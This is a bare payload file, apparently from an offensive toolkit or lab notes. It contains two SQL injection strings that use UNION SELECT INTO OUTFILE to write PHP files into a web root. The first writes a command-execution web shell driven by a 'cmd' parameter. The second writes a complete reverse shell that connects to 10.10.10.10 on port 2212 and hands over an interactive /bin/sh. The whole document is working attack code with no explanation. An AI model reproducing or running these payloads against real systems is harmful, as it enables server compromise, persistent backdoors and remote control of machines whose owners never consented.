' union select (select '<?php 
if(isset($_REQUEST['cmd'])){
echo "<pre>";
$cmd = ($_REQUEST['cmd']);
system($cmd);
echo "</pre>";
die;
}
?>//'),1,1,1,1,1,1,1 into outfile '/var/www/shell1.php' #


' union select (select '<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = "10.10.10.10";
$port = 2212;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = "uname -a; w; id; /bin/sh -i";
$daemon = 0;
$debug = 0;

if (function_exists("pcntl_fork")) {
$pid = pcntl_fork();
if ($pid == -1) {
printit("ERROR: Cant fork");
exit(1);
}
if ($pid) {
exit(0);  
}
if (posix_setsid() == -1) {
printit("Error: Cant setsid()");
exit(1);
}

$daemon = 1;
} else {
printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
printit("$errstr ($errno)");
exit(1);
}
$descriptorspec = array(array("pipe", "r"),array("pipe", "w"),array("pipe", "w"));
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
printit("ERROR: Cant spawn shell");
exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
if (feof($sock)) {
printit("ERROR: Shell connection terminated");
break;
}
if (feof($pipes[1])) {
printit("ERROR: Shell process terminated");
break;
}
$read_a = array($sock, $pipes[1], $pipes[2]);
$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
if (in_array($sock, $read_a)) {
if ($debug) printit("SOCK READ");
$input = fread($sock, $chunk_size);
if ($debug) printit("SOCK: $input");
fwrite($pipes[0], $input);
}
if (in_array($pipes[1], $read_a)) {
if ($debug) printit("STDOUT READ");
$input = fread($pipes[1], $chunk_size);
if ($debug) printit("STDOUT: $input");
fwrite($sock, $input);
}
if (in_array($pipes[2], $read_a)) {
if ($debug) printit("STDERR READ");
$input = fread($pipes[2], $chunk_size);
if ($debug) printit("STDERR: $input");
fwrite($sock, $input);
}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
if (!$daemon) {
print "$string\n";
}
}
?>//'),1,1,1,1,1,1,1 into outfile '/var/www/rev10.php' #

